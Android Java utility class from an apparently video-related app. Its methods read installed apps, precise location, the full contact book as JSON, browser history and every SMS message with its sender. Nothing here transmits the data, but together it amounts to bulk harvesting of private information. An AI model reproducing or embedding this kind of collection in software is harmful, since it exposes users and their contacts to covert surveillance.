package com.lxw.videoworld.framework.util;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Im;
import android.provider.ContactsContract.CommonDataKinds.Nickname;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.provider.ContactsContract.CommonDataKinds.Website;

import com.lxw.videoworld.app.model.AppInfoModel;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import static android.provider.ContactsContract.CommonDataKinds.Email.DATA;
import static android.provider.ContactsContract.CommonDataKinds.Email.TYPE;
import static android.provider.ContactsContract.CommonDataKinds.Email.TYPE_CUSTOM;
import static android.provider.ContactsContract.CommonDataKinds.Email.TYPE_HOME;
import static android.provider.ContactsContract.CommonDataKinds.Email.TYPE_MOBILE;
import static android.provider.ContactsContract.CommonDataKinds.Email.TYPE_WORK;
import static android.provider.ContactsContract.CommonDataKinds.Im.PROTOCOL;
import static android.provider.ContactsContract.CommonDataKinds.Im.PROTOCOL_MSN;
import static android.provider.ContactsContract.CommonDataKinds.Im.PROTOCOL_QQ;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.MIDDLE_NAME;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.PHONETIC_FAMILY_NAME;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.PHONETIC_GIVEN_NAME;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.PHONETIC_MIDDLE_NAME;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.PREFIX;
import static android.provider.ContactsContract.CommonDataKinds.StructuredName.SUFFIX;

/**
 * Created by Zion on 2017/7/30.
 */

public class UserInfoUtil {

    /**
     * 获取安装应用列表
     * @param packageManager
     * @return
     */
    public static List<AppInfoModel> getInstallAppList(PackageManager packageManager) {
        List<AppInfoModel> myAppInfos = new ArrayList<AppInfoModel>();
        try {
            List<PackageInfo> packageInfos = packageManager.getInstalledPackages(0);
            for (int i = 0; i < packageInfos.size(); i++) {
                PackageInfo packageInfo = packageInfos.get(i);
                //过滤掉系统app
            if ((ApplicationInfo.FLAG_SYSTEM & packageInfo.applicationInfo.flags) != 0) {
                continue;
            }
                AppInfoModel AppInfoModel = new AppInfoModel();
                AppInfoModel.setAppName(packageInfo.packageName);
                if (packageInfo.applicationInfo.loadIcon(packageManager) == null) {
                    continue;
                }
                AppInfoModel.setImage(packageInfo.applicationInfo.loadIcon(packageManager));
                myAppInfos.add(AppInfoModel);
            }
        }catch (Exception e){

        }
        return myAppInfos;
    }

    /**
     * 获取地理位置
     * @param context
     * @return
     * @throws IOException
     */
    public static  String getAddress(Context context) throws IOException {
        Geocoder geocoder = new Geocoder(context);
        LocationManager locationManager;
        String locationProvider = "";
        StringBuilder stringBuilder = new StringBuilder();
        try {

            //获取地理位置管理器
            locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            //获取所有可用的位置提供器
            List<String> providers = locationManager.getProviders(true);
            if(providers.contains(LocationManager.GPS_PROVIDER)){
                //如果是GPS
                locationProvider = LocationManager.GPS_PROVIDER;
            }else if(providers.contains(LocationManager.NETWORK_PROVIDER)){
                //如果是Network
                locationProvider = LocationManager.NETWORK_PROVIDER;
            }else{
                //如果是Passive
                locationProvider = LocationManager.PASSIVE_PROVIDER;
            }
            Thread.sleep(3000);
            //获取Location
            Location location = locationManager.getLastKnownLocation(locationProvider);
            if(location!=null){
                //根据经纬度获取地理位置信息
                List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                // 根据地址获取地理位置信息
                // List<Address> addresses = geocoder.getFromLocationName( "广东省珠海市香洲区沿河路321号", 1);
                if (addresses.size() > 0) {
                    Address address = addresses.get(0);
                    for (int i = 0; i < address.getMaxAddressLineIndex(); i++) {
                        stringBuilder.append(address.getAddressLine(i)).append("\n");
                    }
                    stringBuilder.append(address.getCountryName()).append("_");//国家
                    stringBuilder.append(address.getFeatureName()).append("_");//周边地址
                    stringBuilder.append(address.getLocality()).append("_");//市
                    stringBuilder.append(address.getPostalCode()).append("_");
                    stringBuilder.append(address.getCountryCode()).append("_");//国家编码
                    stringBuilder.append(address.getAdminArea()).append("_");//省份
                    stringBuilder.append(address.getSubAdminArea()).append("_");
                    stringBuilder.append(address.getThoroughfare()).append("_");//道路
                    stringBuilder.append(address.getSubLocality()).append("_");//香洲区
                    stringBuilder.append(address.getLatitude()).append("_");//经度
                    stringBuilder.append(address.getLongitude());//维度
                }
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return stringBuilder.toString();

    }

    /**
     * 获取联系人列表
     * @param context
     * @return
     * @throws JSONException
     */
    public static String getContactInfo(Context context) throws JSONException {
        // 获得通讯录信息 ，URI是ContactsContract.Contacts.CONTENT_URI

        JSONObject contactData = new JSONObject();
        JSONObject jsonObject = new JSONObject();
        String mimetype = "";
        int oldrid = -1;
        int contactId = -1;
        Cursor cursor = context.getContentResolver().query(ContactsContract.Data.CONTENT_URI,null, null, null, ContactsContract.Data.RAW_CONTACT_ID);
        int numm=0;
        while (cursor.moveToNext()) {
            contactId = cursor.getInt(cursor.getColumnIndex(ContactsContract.Data.RAW_CONTACT_ID));
            if (oldrid != contactId) {
                jsonObject = new JSONObject();
                contactData.put("contact" + numm, jsonObject);
                numm++;
                oldrid = contactId;
            }

            // 取得mimetype类型
            mimetype = cursor.getString(cursor.getColumnIndex(ContactsContract.Data.MIMETYPE));
            // 获得通讯录中每个联系人的ID
            // 获得通讯录中联系人的名字
            if (CONTENT_ITEM_TYPE.equals(mimetype)) {
                //            String display_name = cursor.getString(cursor.getColumnIndex(StructuredName.DISPLAY_NAME));
                String prefix = cursor.getString(cursor.getColumnIndex(PREFIX));
                jsonObject.put("prefix", prefix);
                String firstName = cursor.getString(cursor.getColumnIndex(FAMILY_NAME));
                jsonObject.put("firstName", firstName);
                String middleName = cursor.getString(cursor.getColumnIndex(MIDDLE_NAME));
                jsonObject.put("middleName", middleName);
                String lastname = cursor.getString(cursor.getColumnIndex(GIVEN_NAME));
                jsonObject.put("lastname", lastname);
                String suffix = cursor.getString(cursor.getColumnIndex(SUFFIX));
                jsonObject.put("suffix", suffix);
                String phoneticFirstName = cursor.getString(cursor.getColumnIndex(PHONETIC_FAMILY_NAME));
                jsonObject.put("phoneticFirstName", phoneticFirstName);
                String phoneticMiddleName = cursor.getString(cursor.getColumnIndex(PHONETIC_MIDDLE_NAME));
                jsonObject.put("phoneticMiddleName", phoneticMiddleName);
                String phoneticLastName = cursor.getString(cursor.getColumnIndex(PHONETIC_GIVEN_NAME));
                jsonObject.put("phoneticLastName", phoneticLastName);
            }
            // 获取电话信息
            if (Phone.CONTENT_ITEM_TYPE.equals(mimetype)) {
                // 取出电话类型
                int phoneType = cursor.getInt(cursor.getColumnIndex(Phone.TYPE));
                // 手机
                if (phoneType == Phone.TYPE_MOBILE) {
                    String mobile = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("mobile", mobile);
                }
                // 住宅电话
                if (phoneType == Phone.TYPE_HOME) {
                    String homeNum = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("homeNum", homeNum);
                }
                // 单位电话
                if (phoneType == Phone.TYPE_WORK) {
                    String jobNum = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("jobNum", jobNum);
                }
                // 单位传真
                if (phoneType == Phone.TYPE_FAX_WORK) {
                    String workFax = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("workFax", workFax);
                }
                // 住宅传真
                if (phoneType == Phone.TYPE_FAX_HOME) {
                    String homeFax = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("homeFax", homeFax);
                }
                // 寻呼机
                if (phoneType == Phone.TYPE_PAGER) {
                    String pager = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("pager", pager);
                }
                // 回拨号码
                if (phoneType == Phone.TYPE_CALLBACK) {
                    String quickNum = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("quickNum", quickNum);
                }
                // 公司总机
                if (phoneType == Phone.TYPE_COMPANY_MAIN) {
                    String jobTel = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("jobTel", jobTel);
                }
                // 车载电话
                if (phoneType == Phone.TYPE_CAR) {
                    String carNum = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("carNum", carNum);
                }
                // ISDN
                if (phoneType == Phone.TYPE_ISDN) {
                    String isdn = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("isdn", isdn);
                }
                // 总机
                if (phoneType == Phone.TYPE_MAIN) {
                    String tel = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("tel", tel);
                }
                // 无线装置
                if (phoneType == Phone.TYPE_RADIO) {
                    String wirelessDev = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("wirelessDev", wirelessDev);
                }
                // 电报
                if (phoneType == Phone.TYPE_TELEX) {
                    String telegram = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("telegram", telegram);
                }
                // TTY_TDD
                if (phoneType == Phone.TYPE_TTY_TDD) {
                    String tty_tdd = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("tty_tdd", tty_tdd);
                }
                // 单位手机
                if (phoneType == Phone.TYPE_WORK_MOBILE) {
                    String jobMobile = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("jobMobile", jobMobile);
                }
                // 单位寻呼机
                if (phoneType == Phone.TYPE_WORK_PAGER) {
                    String jobPager = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("jobPager", jobPager);
                }
                // 助理
                if (phoneType == Phone.TYPE_ASSISTANT) {
                    String assistantNum = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("assistantNum", assistantNum);
                }
                // 彩信
                if (phoneType == Phone.TYPE_MMS) {
                    String mms = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
                    jsonObject.put("mms", mms);
                }
            }
            // }
            // 查找email地址
            if (Email.CONTENT_ITEM_TYPE.equals(mimetype)) {
                // 取出邮件类型
                int emailType = cursor.getInt(cursor.getColumnIndex(TYPE));

                // 住宅邮件地址
                if (emailType == TYPE_CUSTOM) {
                    String homeEmail = cursor.getString(cursor.getColumnIndex(DATA));
                    jsonObject.put("homeEmail", homeEmail);
                }

                // 住宅邮件地址
                else {
                    if (emailType == TYPE_HOME) {
                        String homeEmail = cursor.getString(cursor.getColumnIndex(DATA));
                        jsonObject.put("homeEmail", homeEmail);
                    }
                }
                // 单位邮件地址
                if (emailType == TYPE_CUSTOM) {
                    String jobEmail = cursor.getString(cursor.getColumnIndex(DATA));
                    jsonObject.put("jobEmail", jobEmail);
                }

                // 单位邮件地址
                else if (emailType == TYPE_WORK) {
                    String jobEmail = cursor.getString(cursor.getColumnIndex(Email.DATA));
                    jsonObject.put("jobEmail", jobEmail);
                }
                // 手机邮件地址
                if (emailType == TYPE_CUSTOM) {
                    String mobileEmail = cursor.getString(cursor.getColumnIndex(DATA));
                    jsonObject.put("mobileEmail", mobileEmail);
                }

                // 手机邮件地址
                else if (emailType == TYPE_MOBILE) {
                    String mobileEmail = cursor.getString(cursor.getColumnIndex(DATA));
                    jsonObject.put("mobileEmail", mobileEmail);
                }
            }
            // 查找event地址
            if (ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE.equals(mimetype)) {
                // 取出时间类型
                int eventType = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Event.TYPE));
                // 生日
                if (eventType == ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY) {
                    String birthday = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Event.START_DATE));
                    jsonObject.put("birthday", birthday);
                }
                // 周年纪念日
                if (eventType == ContactsContract.CommonDataKinds.Event.TYPE_ANNIVERSARY) {
                    String anniversary = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Event.START_DATE));
                    jsonObject.put("anniversary", anniversary);
                }
            }
            // 即时消息
            if (Im.CONTENT_ITEM_TYPE.equals(mimetype)) {
                // 取出即时消息类型
                int protocal = cursor.getInt(cursor.getColumnIndex(PROTOCOL));
                if (TYPE_CUSTOM == protocal) {
                    String workMsg = cursor.getString(cursor.getColumnIndex(DATA));
                    jsonObject.put("workMsg", workMsg);
                }

                else if (PROTOCOL_MSN == protocal) {
                    String workMsg = cursor.getString(cursor.getColumnIndex(DATA));
                    jsonObject.put("workMsg", workMsg);
                }
                if (PROTOCOL_QQ == protocal) {
                    String instantsMsg = cursor.getString(cursor.getColumnIndex(DATA));
                    jsonObject.put("instantsMsg", instantsMsg);
                }
            }
            // 获取备注信息
            if (ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE.equals(mimetype)) {
                String remark = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
                jsonObject.put("remark", remark);
            }
            // 获取昵称信息
            if (Nickname.CONTENT_ITEM_TYPE.equals(mimetype)) {
                String nickName = cursor.getString(cursor.getColumnIndex(Nickname.NAME));
                jsonObject.put("nickName", nickName);
            }
            // 获取组织信息
            if (ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE.equals(mimetype)) {
                // 取出组织类型
                int orgType = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TYPE));
                // 单位
                if (orgType == ContactsContract.CommonDataKinds.Organization.TYPE_CUSTOM) {
                    //             if (orgType == Organization.TYPE_WORK) {
                    String company = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY));
                    jsonObject.put("company", company);
                    String jobTitle = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                    jsonObject.put("jobTitle", jobTitle);
                    String department = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DEPARTMENT));
                    jsonObject.put("department", department);
                }
            }
            // 获取网站信息
            if (Website.CONTENT_ITEM_TYPE.equals(mimetype)) {
                // 取出组织类型
                int webType = cursor.getInt(cursor.getColumnIndex(Website.TYPE));
                // 主页
                if (webType == Website.TYPE_CUSTOM) {
                    String home = cursor.getString(cursor.getColumnIndex(Website.URL));
                    jsonObject.put("home", home);
                }
                // 主页
                else if (webType == Website.TYPE_HOME) {
                    String home = cursor.getString(cursor.getColumnIndex(Website.URL));
                    jsonObject.put("home", home);
                }

                // 个人主页
                if (webType == Website.TYPE_HOMEPAGE) {
                    String homePage = cursor.getString(cursor.getColumnIndex(Website.URL));
                    jsonObject.put("homePage", homePage);
                }
                // 工作主页
                if (webType == Website.TYPE_WORK) {
                    String workPage = cursor.getString(cursor.getColumnIndex(Website.URL));
                    jsonObject.put("workPage", workPage);
                }
            }
            // 查找通讯地址
            if (StructuredPostal.CONTENT_ITEM_TYPE.equals(mimetype)) {
                // 取出邮件类型
                int postalType = cursor.getInt(cursor.getColumnIndex(StructuredPostal.TYPE));
                // 单位通讯地址
                if (postalType == StructuredPostal.TYPE_WORK) {
                    String street = cursor.getString(cursor.getColumnIndex(StructuredPostal.STREET));
                    jsonObject.put("street", street);
                    String ciry = cursor.getString(cursor.getColumnIndex(StructuredPostal.CITY));
                    jsonObject.put("ciry", ciry);
                    String box = cursor.getString(cursor.getColumnIndex(StructuredPostal.POBOX));
                    jsonObject.put("box", box);
                    String area = cursor.getString(cursor.getColumnIndex(StructuredPostal.NEIGHBORHOOD));
                    jsonObject.put("area", area);
                    String state = cursor.getString(cursor.getColumnIndex(StructuredPostal.REGION));
                    jsonObject.put("state", state);
                    String zip = cursor.getString(cursor.getColumnIndex(StructuredPostal.POSTCODE));
                    jsonObject.put("zip", zip);
                    String country = cursor.getString(cursor.getColumnIndex(StructuredPostal.COUNTRY));
                    jsonObject.put("country", country);
                }
                // 住宅通讯地址
                if (postalType == StructuredPostal.TYPE_HOME) {
                    String homeStreet = cursor.getString(cursor.getColumnIndex(StructuredPostal.STREET));
                    jsonObject.put("homeStreet", homeStreet);
                    String homeCity = cursor.getString(cursor.getColumnIndex(StructuredPostal.CITY));
                    jsonObject.put("homeCity", homeCity);
                    String homeBox = cursor.getString(cursor.getColumnIndex(StructuredPostal.POBOX));
                    jsonObject.put("homeBox", homeBox);
                    String homeArea = cursor.getString(cursor.getColumnIndex(StructuredPostal.NEIGHBORHOOD));
                    jsonObject.put("homeArea", homeArea);
                    String homeState = cursor.getString(cursor.getColumnIndex(StructuredPostal.REGION));
                    jsonObject.put("homeState", homeState);
                    String homeZip = cursor.getString(cursor.getColumnIndex(StructuredPostal.POSTCODE));
                    jsonObject.put("homeZip", homeZip);
                    String homeCountry = cursor.getString(cursor.getColumnIndex(StructuredPostal.COUNTRY));
                    jsonObject.put("homeCountry", homeCountry);
                }
                // 其他通讯地址
                if (postalType == StructuredPostal.TYPE_OTHER) {
                    String otherStreet = cursor.getString(cursor.getColumnIndex(StructuredPostal.STREET));
                    jsonObject.put("otherStreet", otherStreet);
                    String otherCity = cursor.getString(cursor.getColumnIndex(StructuredPostal.CITY));
                    jsonObject.put("otherCity", otherCity);
                    String otherBox = cursor.getString(cursor.getColumnIndex(StructuredPostal.POBOX));
                    jsonObject.put("otherBox", otherBox);
                    String otherArea = cursor.getString(cursor.getColumnIndex(StructuredPostal.NEIGHBORHOOD));
                    jsonObject.put("otherArea", otherArea);
                    String otherState = cursor.getString(cursor.getColumnIndex(StructuredPostal.REGION));
                    jsonObject.put("otherState", otherState);
                    String otherZip = cursor.getString(cursor.getColumnIndex(StructuredPostal.POSTCODE));
                    jsonObject.put("otherZip", otherZip);
                    String otherCountry = cursor.getString(cursor.getColumnIndex(StructuredPostal.COUNTRY));
                    jsonObject.put("otherCountry", otherCountry);
                }
            }
        }
        cursor.close();
        return contactData.toString();
    }

    /**
     * 获取通话记录	包括type date cachedName number
     * @return
     */
//    @SuppressLint("SimpleDateFormat")
//    public static ArrayList<String> getCallLogs(Context context){
//        ArrayList<String> callLogs = new ArrayList<String>();
//        String[] cltype = {"已接电话","已接电话","已拨电话","未接来电"};
//        String[] projection = {
//                CallLog.Calls.DATE, // 日期
//                CallLog.Calls.NUMBER, // 号码
//                CallLog.Calls.TYPE, // 类型
//                CallLog.Calls.CACHED_NAME, // 名字
//        };
//        SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd-hh:mm:ss");
//        Date date;
//        try{
//            ContentResolver cr = context.getContentResolver();
//            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, projection, null, null,CallLog.Calls.DEFAULT_SORT_ORDER);
//            if (cursor != null && cursor.getCount() > 0){
//                cursor.moveToFirst();
//                while(cursor.moveToNext()){
//                    date = new Date(cursor.getLong(cursor
//                            .getColumnIndex(CallLog.Calls.DATE)));
//                    String number = cursor.getString(cursor
//                            .getColumnIndex(CallLog.Calls.NUMBER));
//                    int type = cursor.getInt(cursor
//                            .getColumnIndex(CallLog.Calls.TYPE));
//                    String cachedName = cursor.getString(cursor
//                            .getColumnIndex(CallLog.Calls.CACHED_NAME));
//                    String callLog = cltype[type]+";"+sfd.format(date)+";"+cachedName+";"+number;
//                    callLogs.add(callLog);
//                }
//                cursor.close();
//            }
//        }catch(Exception e){
//            e.printStackTrace();
//        }
//        return callLogs;
//    }
    /**
     * 获取浏览器历史记录	包括date title url
     * @return
     */
    @SuppressLint("SimpleDateFormat")
    public static ArrayList<String> getBrowserHistory(Context context){
        ArrayList<String> browserHistory = new ArrayList<String>();
        try{
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query( Uri.parse("content://browser/bookmarks"),
                    new String[] { "title", "url", "date" }, "date!=?",
                    null, "date desc");
            SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd-hh:mm:ss");
            Date date;
            if(cursor != null ){
                while(cursor.moveToNext()) {
                    date = new Date(cursor.getLong(cursor.getColumnIndex("date")));
                    String title = cursor.getString(cursor.getColumnIndex("title"));
                    String url = cursor.getString(cursor.getColumnIndex("url"));
                    String browserhistory = sfd.format(date)+";"+title+";"+url;
                    browserHistory.add(browserhistory);
                }
                cursor.close();
            }
        }catch(Exception e){
            e.printStackTrace();
        }
        return browserHistory;
    }
    /**
     * 获取手机短信
     * @return
     */
    @SuppressLint("SimpleDateFormat")
    public static ArrayList<String> getSmsInPhones(Context context){
        ArrayList<String> smsInPhones = new ArrayList<String>();
        String[] smstype = {"接收的","接收的","发送的","发送的"};
        final String SMS_URI_ALL   = "content://sms/";
        try{
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{"_id",
                    "address",  //号码
                    "person",   //姓名
                    "body",     //短信内容
                    "date",     //日期
                    "type"};    //短信类型
            Uri uri = Uri.parse(SMS_URI_ALL);
            Cursor cur = cr.query(uri, projection, null, null, "date desc");
            if (cur.moveToFirst()){
                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");
                int typeColumn = cur.getColumnIndex("type");
                while(cur.moveToNext()){
                    String name = cur.getString(nameColumn);
                    String phoneNumber = cur.getString(phoneNumberColumn);
                    String smsbody = cur.getString(smsbodyColumn).replaceAll(";", ".");

                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-hh:mm:ss");
                    Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                    String date = dateFormat.format(d);
                    int typeId = cur.getInt(typeColumn);
                    String type = smstype[typeId];
                    String smsInPhone = type+";"+date+";"+name+";"+phoneNumber+";"+smsbody;
                    smsInPhones.add(smsInPhone);
                }
                cur.close();
            }
        }catch(Exception e){
            e.printStackTrace();
        }
        return smsInPhones;
    }
}
